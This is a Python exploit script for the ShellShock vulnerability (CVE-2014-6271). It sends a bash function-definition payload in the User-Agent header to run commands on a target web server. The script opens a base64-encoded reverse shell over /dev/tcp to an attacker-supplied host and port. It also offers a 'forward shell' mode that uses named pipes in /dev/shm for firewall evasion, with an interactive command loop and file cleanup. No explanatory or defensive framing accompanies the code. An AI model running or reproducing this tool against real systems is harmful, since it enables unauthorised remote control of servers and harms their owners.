import requests
import argparse
import base64
import threading
import time

class Shocker:
    def __init__(self,target,lhost,lport):
        self.target = target
        self.lhost = lhost
        self.lport = lport
        self.url = self.url_fix()
        if args.fs:
            self.input = "/dev/shm/input"
            self.output = "/dev/shm/output"
            self.makefifo()
             
            self.thread = threading.Thread(target=self.readoutput, args=())
            self.thread.daemon = True
            self.thread.start()

            self.write_cmd()
        else:
            cmd = "bash -c 'bash -i >& /dev/tcp/" + self.lhost + "/" + self.lport + " 0>&1'"
            cmd_encoded = self.base64encode(cmd)
            print("Sending Header Payload for reverse shell")
            print("() { :;}; echo; /bin/bash -c 'echo " + cmd_encoded + " | base64 -d | sh'")
            self.shellshock(cmd_encoded)

    def url_fix(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def base64encode(self,string):
        string_bytes = string.encode("ascii")
        base64_bytes = base64.b64encode(string_bytes)
        base64_string = base64_bytes.decode("ascii")

        return base64_string

    def makefifo(self):
        make_fifo = "mkfifo " + self.input + "; tail -f " + self.input + " | /bin/sh 2>&1 > " + self.output
        make_fifo_encoded = self.base64encode(make_fifo)
        self.shellshock(make_fifo_encoded)

    def shellshock(self,cmd):
        requests.packages.urllib3.disable_warnings()
        payload = "() { :;}; echo; /bin/bash -c 'echo " + cmd + " | base64 -d | sh'"        
        useragent = {"User-Agent": payload}

        try:
            req_site = requests.get(self.url, headers=useragent, verify=False,timeout=1)
            return req_site.text.strip()
        except:
            pass

    def readoutput(self):
        read_file = "/bin/cat " + self.output
        read_file_encoded = self.base64encode(read_file)
        while True:
            output = self.shellshock(read_file_encoded) 
            if output:
                print(output)
                clear_file = "echo -n '' > " + self.output
                clear_file_encoded = self.base64encode(clear_file)
                self.shellshock(clear_file_encoded)
            time.sleep(1)

    def write_cmd(self):
        requests.packages.urllib3.disable_warnings()
        while True:
            try:
                rce = input("RCE: ")
                rce = rce + "\n"
                rce_encoded = self.base64encode(rce)
                payload = "() { :;}; echo; /bin/bash -c 'echo " + rce_encoded + " | base64 -d > " + self.input + "'" 
                useragent = {"User-Agent": payload}

                requests.get(self.url, headers=useragent, verify=False)
                time.sleep(2.5)

            except KeyboardInterrupt:
                remove_files = "rm " + self.input + ";rm " + self.output
                remove_files_encoded = self.base64encode(remove_files)
                self.shellshock(remove_files_encoded)
                print("\nBye Bye!")
                exit()


if __name__ == "__main__":
    print('CVE 2014-6271 - ShellShock Remote Code Execution')
    parser = argparse.ArgumentParser(description='CVE 2014-6271 - ShellShock Remote Code Execution')
    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://shock.me/', required=True)
    parser.add_argument('-lhost', metavar='<lhost>', help='Your IP Address', required=False)
    parser.add_argument('-lport', metavar='<lport>', help='Your Listening Port', required=False)
    parser.add_argument('-fs',action='store_true',help='Forward Shell for Firewall Evasion', required=False) 

    args = parser.parse_args()
    try:
        Shocker(args.t,args.lhost,args.lport)
    except TypeError:
        print("We need either -lhost or -lport arguments or -fs")